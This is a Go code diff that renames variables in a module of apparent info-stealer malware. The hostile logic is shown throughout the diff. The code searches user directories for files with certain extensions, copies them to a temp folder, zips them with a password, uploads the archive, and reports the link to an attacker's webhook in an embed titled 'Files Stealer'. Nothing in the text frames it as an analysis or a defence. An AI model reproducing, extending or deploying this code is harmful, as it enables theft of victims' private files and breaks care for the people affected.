@@ -14,9 +14,9 @@ import (
 )
 
 func Run(webhook string) {
-	tempdir := filepath.Join(os.TempDir(), "commonfiles-temp")
-	os.MkdirAll(tempdir, os.ModePerm)
-	defer os.RemoveAll(tempdir)
+	tempDir := filepath.Join(os.TempDir(), "commonfiles-temp")
+	os.MkdirAll(tempDir, os.ModePerm)
+	defer os.RemoveAll(tempDir)
 
 	extensions := []string{
 		".txt",
@@ -111,11 +111,11 @@ func Run(webhook string) {
 						if !strings.HasSuffix(strings.ToLower(info.Name()), extension) {
 							continue
 						}
-						dest := filepath.Join(tempdir, strings.Split(user, "\\")[2], info.Name())
+						dest := filepath.Join(tempDir, strings.Split(user, "\\")[2], info.Name())
 						if fileutil.Exists(dest) {
-							dest = filepath.Join(tempdir, strings.Split(user, "\\")[2], fmt.Sprintf("%s_%s", info.Name(), randString(4)))
+							dest = filepath.Join(tempDir, strings.Split(user, "\\")[2], fmt.Sprintf("%s_%s", info.Name(), randString(4)))
 						}
-						os.MkdirAll(filepath.Join(tempdir, strings.Split(user, "\\")[2]), os.ModePerm)
+						os.MkdirAll(filepath.Join(tempDir, strings.Split(user, "\\")[2]), os.ModePerm)
 
 						err := fileutil.CopyFile(path, dest)
 						if err != nil {
@@ -135,12 +135,12 @@ func Run(webhook string) {
 		return
 	}
 
-	tempzip := filepath.Join(os.TempDir(), "commonfiles.zip")
+	tempZip := filepath.Join(os.TempDir(), "commonfiles.zip")
 	password := randString(16)
-	fileutil.ZipWithPassword(tempdir, tempzip, password)
-	defer os.Remove(tempzip)
+	fileutil.ZipWithPassword(tempDir, tempZip, password)
+	defer os.Remove(tempZip)
 
-	link, err := requests.Upload(tempzip)
+	link, err := requests.Upload(tempZip)
 	if err != nil {
 		return
 	}
@@ -149,7 +149,7 @@ func Run(webhook string) {
 		"embeds": []map[string]interface{}{
 			{
 				"title":       "Files Stealer",
-				"description": "```" + fileutil.Tree(tempdir, "") + "```",
+				"description": "```" + fileutil.Tree(tempDir, "") + "```",
 				"fields": []map[string]interface{}{
 					{
 						"name":   "Archive Link",
